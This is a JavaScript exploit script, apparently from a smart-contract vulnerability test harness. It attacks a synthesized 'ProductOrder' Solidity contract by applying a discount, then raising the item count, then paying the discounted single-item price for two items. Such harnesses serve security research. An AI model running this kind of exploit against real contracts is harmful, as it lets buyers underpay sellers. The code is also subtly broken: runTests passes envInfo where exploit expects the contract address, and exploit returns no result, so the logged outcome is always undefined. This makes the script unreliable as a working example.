require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');

const { createLoggerWeb3 } = require('@lib/web3/deploy');


const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');

let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', 'ProductOrder-3.sol'), 'utf8');

const exploit = async (web3, contractAddress) => {
    // Compile the contract to get ABI
    let solcVersion = extractSolcVersion(source);
        
    let { abi } = await compileWithVersion(source, 'ProductOrder-3.sol', 'ProductOrder', solcVersion);
    

    const contractInstance = new web3.eth.Contract(abi, contractAddress);

    try {
        // Step 1: Apply discount normally
        await contractInstance.methods.applyDiscount().send({
            from: web3.eth.accounts[0],
            gas: 3000000
        });
        await sleep(200);

        // Step 2: Increment item count after discount is applied
        await contractInstance.methods.incrementItemCount().send({
            from: web3.eth.accounts[0],
            gas: 3000000
        });
        await sleep(200);

        // Step 3: Pay for the order with the discounted price for only 1 item but for 2 items ordered
        let discountedPrice = await contractInstance.methods.price().call();
        await contractInstance.methods.payForOrder().send({
            from: web3.eth.accounts[0],
            value: discountedPrice,
            gas: 3000000
        });
        await sleep(200);

        console.log("Exploit executed: Paid less for more items.");
    } catch (error) {
        console.error("Exploit failed:", error.message);
    }
};



module.exports = async function runTests(web3, envInfo, contractAddress) {
    web3 = await createLoggerWeb3(web3);
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
